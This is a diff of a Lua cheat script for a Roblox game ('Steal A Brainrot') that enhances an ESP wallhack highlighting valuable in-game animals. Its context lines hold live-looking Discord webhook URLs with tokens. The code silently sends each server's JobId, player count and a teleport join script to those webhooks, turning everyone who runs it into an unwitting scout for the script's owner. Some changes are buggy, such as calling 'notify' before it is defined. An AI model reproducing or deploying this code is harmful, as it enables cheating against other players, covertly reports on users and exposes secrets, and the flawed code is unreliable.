@@ -1,5 +1,5 @@
 -- ================================
--- Scripts Hub X | Official (Fixed Version) + ESP Enhancement
+-- Scripts Hub X | Official (Fixed Version) + Enhanced ESP with Multiple Detection
 -- ================================
 
 -- Services
@@ -97,12 +97,12 @@ for _, name in pairs(espTargetNames) do
     espTargetLookup[name] = true
 end
 
--- Tracked animals to prevent spam
+-- Enhanced tracking system for multiple instances
 local loggedAnimals = {}
-
--- ESP Storage
-local espObjects = {}
+local animalCounts = {} -- Track counts per animal type
+local espObjects = {} -- Changed to support multiple instances
 local espEnabled = true
+local espCounter = 0 -- Unique ID generator for ESP
 
 -- UserIds
 local OwnerUserId = "2341777244"
@@ -133,22 +133,32 @@ local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf
 local webhookUrll = "https://discord.com/api/webhooks/1403702581104218153/k_yKYW6971_qADkSO6iuOjj7AIaXIfQuVcIs0mZIpNWJAc_cORIf0ieSDBlN8zibbHi-"
 
 -- ================================
--- ESP FUNCTIONS
+-- ENHANCED ESP FUNCTIONS
 -- ================================
 
--- Create ESP for a single object
+-- Create ESP for a single object with unique ID
 local function createESP(object, animalName)
     if not object or not object.Parent then return end
     
-    local espId = tostring(object) .. "_" .. animalName
+    -- Generate unique ESP ID for multiple instances
+    espCounter = espCounter + 1
+    local espId = animalName .. "_" .. espCounter .. "_" .. tostring(object)
     
-    -- Prevent duplicate ESP
-    if espObjects[espId] then return end
+    -- Prevent duplicate ESP for the same object
+    local existingESP = false
+    for id, espData in pairs(espObjects) do
+        if espData.object == object then
+            existingESP = true
+            break
+        end
+    end
+    
+    if existingESP then return end
     
     -- Create ESP container
     local espContainer = {}
     
-    -- Function to create highlight effect
+    -- Function to create enhanced highlight effect that covers entire model
     local function createHighlight()
         local highlight = Instance.new("Highlight")
         highlight.Parent = object
@@ -157,10 +167,14 @@ local function createESP(object, animalName)
         highlight.FillTransparency = 0.7
         highlight.OutlineTransparency = 0
         highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        
+        -- Ensure it covers the entire model
+        highlight.Adornee = object
+        
         return highlight
     end
     
-    -- Function to create name label
+    -- Function to create name label with count
     local function createNameLabel()
         local billboardGui = Instance.new("BillboardGui")
         billboardGui.Parent = object
@@ -168,11 +182,15 @@ local function createESP(object, animalName)
         billboardGui.StudsOffset = Vector3.new(0, 5, 0)
         billboardGui.AlwaysOnTop = true
         
+        -- Count how many of this animal type we have
+        local count = animalCounts[animalName] or 1
+        local displayText = animalName .. (count > 1 and " (" .. count .. ")" or "")
+        
         local nameLabel = Instance.new("TextLabel")
         nameLabel.Parent = billboardGui
         nameLabel.Size = UDim2.new(1, 0, 1, 0)
         nameLabel.BackgroundTransparency = 1
-        nameLabel.Text = animalName
+        nameLabel.Text = displayText
         nameLabel.TextColor3 = Color3.new(0, 0.8, 1) -- Bright blue
         nameLabel.TextStrokeTransparency = 0
         nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
@@ -189,27 +207,56 @@ local function createESP(object, animalName)
         return billboardGui
     end
     
-    -- Function to create selection box (additional outline)
+    -- Function to create thin selection box outline
     local function createSelectionBox()
         local selectionBox = Instance.new("SelectionBox")
         selectionBox.Parent = object
         selectionBox.Adornee = object
         selectionBox.Color3 = Color3.new(0, 0.8, 1) -- Bright blue
-        selectionBox.LineThickness = 0.2
-        selectionBox.Transparency = 0.2
+        selectionBox.LineThickness = 0.05 -- Much thinner outline
+        selectionBox.Transparency = 0.1
+        selectionBox.SurfaceTransparency = 0.9
+        
         return selectionBox
+    end
+    
+    -- Function to add box outline to all parts in the model
+    local function addPartOutlines()
+        local outlines = {}
+        
+        local function addOutlineToDescendants(parent)
+            for _, child in pairs(parent:GetChildren()) do
+                if child:IsA("BasePart") then
+                    local partBox = Instance.new("SelectionBox")
+                    partBox.Parent = child
+                    partBox.Adornee = child
+                    partBox.Color3 = Color3.new(0, 0.8, 1)
+                    partBox.LineThickness = 0.03 -- Very thin
+                    partBox.Transparency = 0.2
+                    partBox.SurfaceTransparency = 1
+                    table.insert(outlines, partBox)
+                end
+                addOutlineToDescendants(child)
+            end
+        end
+        
+        addOutlineToDescendants(object)
+        return outlines
     end
     
     -- Create all ESP components
     local highlight = createHighlight()
     local nameLabel = createNameLabel()
     local selectionBox = createSelectionBox()
+    local partOutlines = addPartOutlines()
     
     -- Store ESP components
     espContainer.highlight = highlight
     espContainer.nameLabel = nameLabel
     espContainer.selectionBox = selectionBox
+    espContainer.partOutlines = partOutlines
     espContainer.object = object
+    espContainer.animalName = animalName
     
     espObjects[espId] = espContainer
     
@@ -226,15 +273,21 @@ local function createESP(object, animalName)
                 if espObjects[espId].selectionBox then
                     espObjects[espId].selectionBox:Destroy()
                 end
+                if espObjects[espId].partOutlines then
+                    for _, outline in pairs(espObjects[espId].partOutlines) do
+                        if outline then outline:Destroy() end
+                    end
+                end
                 espObjects[espId] = nil
             end
         end
     end)
+    
+    return espId
 end
 
 -- Remove ESP from an object
-local function removeESP(object, animalName)
-    local espId = tostring(object) .. "_" .. animalName
+local function removeESP(espId)
     if espObjects[espId] then
         if espObjects[espId].highlight then
             espObjects[espId].highlight:Destroy()
@@ -245,13 +298,36 @@ local function removeESP(object, animalName)
         if espObjects[espId].selectionBox then
             espObjects[espId].selectionBox:Destroy()
         end
+        if espObjects[espId].partOutlines then
+            for _, outline in pairs(espObjects[espId].partOutlines) do
+                if outline then outline:Destroy() end
+            end
+        end
         espObjects[espId] = nil
+    end
+end
+
+-- Update ESP labels with current counts
+local function updateESPLabels()
+    for espId, espContainer in pairs(espObjects) do
+        if espContainer.nameLabel and espContainer.animalName then
+            local count = animalCounts[espContainer.animalName] or 1
+            local displayText = espContainer.animalName .. (count > 1 and " (" .. count .. ")" or "")
+            
+            local textLabel = espContainer.nameLabel:FindFirstChild("TextLabel")
+            if textLabel then
+                textLabel.Text = displayText
+            end
+        end
     end
 end
 
 -- Apply ESP to all currently detected brainrots
 local function applyESPToExistingAnimals()
     if not espEnabled then return end
+    
+    -- Reset animal counts
+    animalCounts = {}
     
     -- ESP for plot animals
     local plots = workspace:FindFirstChild("Plots")
@@ -260,6 +336,8 @@ local function applyESPToExistingAnimals()
             if plot:IsA("Model") then
                 for _, child in pairs(plot:GetChildren()) do
                     if child:IsA("Model") and espTargetLookup[child.Name] then
+                        -- Increment count
+                        animalCounts[child.Name] = (animalCounts[child.Name] or 0) + 1
                         createESP(child, child.Name)
                     end
                 end
@@ -272,10 +350,15 @@ local function applyESPToExistingAnimals()
     if renderedAnimals then
         for _, child in pairs(renderedAnimals:GetChildren()) do
             if child:IsA("Model") and espTargetLookup[child.Name] then
+                -- Increment count
+                animalCounts[child.Name] = (animalCounts[child.Name] or 0) + 1
                 createESP(child, child.Name)
             end
         end
     end
+    
+    -- Update all ESP labels with counts
+    updateESPLabels()
 end
 
 -- Clear all ESP
@@ -290,8 +373,14 @@ local function clearAllESP()
         if espContainer.selectionBox then
             espContainer.selectionBox:Destroy()
         end
+        if espContainer.partOutlines then
+            for _, outline in pairs(espContainer.partOutlines) do
+                if outline then outline:Destroy() end
+            end
+        end
     end
     espObjects = {}
+    animalCounts = {}
 end
 
 -- Toggle ESP on/off
@@ -307,10 +396,10 @@ local function toggleESP()
 end
 
 -- ================================
--- ORIGINAL FUNCTIONS (MODIFIED)
+-- ENHANCED ANIMAL LOGGING FUNCTIONS
 -- ================================
 
--- Animal Logger Functions
+-- Enhanced animal scanning with count tracking
 local function scanPlotsForAnimals()
     local plots = workspace:FindFirstChild("Plots")
     if not plots then 
@@ -318,6 +407,7 @@ local function scanPlotsForAnimals()
     end
     
     local foundAnimals = {}
+    local currentCounts = {} -- Track current scan counts
     
     -- Check each randomly generated plot
     for _, plot in pairs(plots:GetChildren()) do
@@ -327,26 +417,36 @@ local function scanPlotsForAnimals()
             -- Check direct children of this plot for target animals
             for _, child in pairs(plot:GetChildren()) do
                 if child:IsA("Model") and espTargetLookup[child.Name] then
-                    local animalId = plotName .. "_" .. child.Name
+                    local animalName = child.Name
+                    local animalId = plotName .. "_" .. animalName .. "_" .. tostring(child)
                     
-                    -- Only log if we haven't logged this animal before
+                    -- Count animals of this type
+                    currentCounts[animalName] = (currentCounts[animalName] or 0) + 1
+                    
+                    -- Only log if we haven't logged this specific instance before
                     if not loggedAnimals[animalId] then
                         table.insert(foundAnimals, {
                             plotName = plotName,
-                            animalName = child.Name,
+                            animalName = animalName,
                             animalId = animalId,
-                            object = child -- Store reference for ESP
+                            object = child
                         })
                         loggedAnimals[animalId] = true
                         
                         -- Apply ESP immediately when found
                         if espEnabled then
-                            createESP(child, child.Name)
+                            animalCounts[animalName] = currentCounts[animalName]
+                            createESP(child, animalName)
                         end
                     end
                 end
             end
         end
+    end
+    
+    -- Update global counts
+    for animalName, count in pairs(currentCounts) do
+        animalCounts[animalName] = count
     end
     
     return foundAnimals
@@ -359,33 +459,45 @@ local function scanRenderedMovingAnimals()
     end
     
     local foundAnimals = {}
+    local currentCounts = {}
     
     -- Check direct children for target animals
     for _, child in pairs(renderedAnimals:GetChildren()) do
         if child:IsA("Model") and espTargetLookup[child.Name] then
-            local animalId = "RenderedMoving_" .. child.Name
+            local animalName = child.Name
+            local animalId = "RenderedMoving_" .. animalName .. "_" .. tostring(child)
             
-            -- Only log if we haven't logged this animal before
+            -- Count animals of this type
+            currentCounts[animalName] = (currentCounts[animalName] or 0) + 1
+            
+            -- Only log if we haven't logged this specific instance before
             if not loggedAnimals[animalId] then
                 table.insert(foundAnimals, {
                     plotName = "RenderedMovingAnimals",
-                    animalName = child.Name,
+                    animalName = animalName,
                     animalId = animalId,
-                    object = child -- Store reference for ESP
+                    object = child
                 })
                 loggedAnimals[animalId] = true
                 
                 -- Apply ESP immediately when found
                 if espEnabled then
-                    createESP(child, child.Name)
+                    animalCounts[animalName] = currentCounts[animalName]
+                    createESP(child, animalName)
                 end
             end
         end
     end
     
+    -- Update global counts
+    for animalName, count in pairs(currentCounts) do
+        animalCounts[animalName] = count
+    end
+    
     return foundAnimals
 end
 
+-- Enhanced logging with count display
 local function sendAnimalLog(animals)
     if #animals == 0 then return end
     
@@ -393,11 +505,22 @@ local function sendAnimalLog(animals)
         local placeId = tostring(game.PlaceId)
         local jobId = game.JobId or "Unknown"
         
-        -- Create animal list text
+        -- Create consolidated animal list with counts
+        local animalTypeCounts = {}
+        for _, animal in pairs(animals) do
+            animalTypeCounts[animal.animalName] = (animalTypeCounts[animal.animalName] or 0) + 1
+        end
+        
         local animalList = ""
-        for i, animal in pairs(animals) do
-            animalList = animalList .. "**" .. animal.animalName .. "**"
-            if i < #animals then
+        local index = 0
+        for animalName, count in pairs(animalTypeCounts) do
+            index = index + 1
+            if count > 1 then
+                animalList = animalList .. "**" .. animalName .. " (" .. count .. ")**"
+            else
+                animalList = animalList .. "**" .. animalName .. "**"
+            end
+            if index < table.maxn(animalTypeCounts) then
                 animalList = animalList .. "\n"
             end
         end
@@ -405,6 +528,11 @@ local function sendAnimalLog(animals)
         -- Create join script
         local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)'
         local playerCount = #Players:GetPlayers()
+        
+        local totalAnimals = 0
+        for _, count in pairs(animalTypeCounts) do
+            totalAnimals = totalAnimals + count
+        end
 			
         local send_data = {
             ["username"] = "Scripts Hub X | Official - Notifyer",
@@ -415,7 +543,7 @@ local function sendAnimalLog(animals)
                     ["description"] = "",
                     ["color"] = 15844367, -- Gold color
                     ["fields"] = {
-                        {["name"] = "Brainrot", ["value"] = animalList, ["inline"] = true},
+                        {["name"] = "Brainrots Found", ["value"] = totalAnimals, ["inline"] = true},
 						{["name"] = "JobId", ["value"] = jobId, ["inline"] = true},
                         {["name"] = "Players", ["value"] = playerCount .. "/8", ["inline"] = true},
 						{["name"] = "Join Script", ["value"] = joinScript, ["inline"] = true},
@@ -463,14 +591,27 @@ local function checkForAnimals()
         table.insert(allAnimals, animal)
     end
     
+    -- Update ESP labels with current counts
+    updateESPLabels()
+    
     -- Send to webhook if animals found (silently)
     if #allAnimals > 0 then
         sendAnimalLog(allAnimals)
         
+        -- Count total animals
+        local totalCount = 0
+        for _, count in pairs(animalCounts) do
+            totalCount = totalCount + count
+        end
+        
         -- Show notification about ESP activation
-        notify("Brainrot Detected", #allAnimals .. " brainrot(s) found and ESP applied!")
+        notify("Brainrot Detected", totalCount .. " brainrot(s) found and ESP applied!")
     end
 end
+
+-- ================================
+-- REMAINING ORIGINAL FUNCTIONS (UNCHANGED)
+-- ================================
 
 -- Notification function
 local function notify(title, text)
@@ -804,10 +945,10 @@ local function checkUserStatus()
 	return "regular"
 end
 
--- Initialize Animal Logger for Steal A Brainrot (ENHANCED WITH ESP)
+-- Initialize Enhanced Animal Logger for Steal A Brainrot
 local function initializeAnimalLogger()
 	if game.PlaceId == STEAL_A_BRAINROT_ID then
-		print("🎯 Initializing Brainrot ESP System...")
+		print("🎯 Initializing Enhanced Brainrot ESP System...")
 		
 		-- Initial scan after delay
 		task.spawn(function()
@@ -869,7 +1010,7 @@ local function initializeAnimalLogger()
 			end
 		end)
 		
-		notify("ESP System", "Brainrot ESP initialized! Press F to toggle ESP.")
+		notify("Enhanced ESP System", "Brainrot ESP with Multiple Detection initialized! Press F to toggle ESP.")
 	end
 end
 
@@ -878,7 +1019,7 @@ end
 -- ================================
 
 spawn(function()
-	print("🚀 Starting Scripts Hub X with ESP Enhancement...")
+	print("🚀 Starting Scripts Hub X with Enhanced ESP System...")
 	
 	-- Check user status
 	local userStatus = checkUserStatus()
@@ -895,7 +1036,7 @@ spawn(function()
 	-- Send webhook notification
 	sendWebhookNotification(userStatus, scriptUrl or "No script URL")
 	
-	-- Initialize Animal Logger with ESP (silently)
+	-- Initialize Enhanced Animal Logger with ESP (silently)
 	initializeAnimalLogger()
 	
 	-- Handle unsupported games
